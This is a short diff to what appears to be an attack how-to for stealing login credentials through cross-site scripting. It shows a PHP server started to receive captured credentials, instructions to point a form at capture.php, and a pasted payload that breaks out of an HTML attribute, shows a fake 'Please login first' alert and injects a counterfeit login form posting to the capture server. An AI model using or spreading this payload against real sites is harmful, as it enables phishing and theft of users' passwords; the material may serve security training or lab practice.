@@ -30,15 +30,18 @@
    ?>
 
 
-## Start the PHP server
+## Start the PHP server and make sure you get the POST request once after capturing the cred
 php -S 0.0.0.0:8000
 
 
-##Form action in your XSS payload should point to:
+
+
+
+## Form action in your XSS payload should point to:
 http://localhost:8000/capture.php
 
 
-##Paste the payload in to the query
+## Paste the payload in to the query
 "><script>alert('Please login first');</script>
 <h3>LOGIN</h3>
 <form action='http://localhost:8000/capture.php' method='post'>
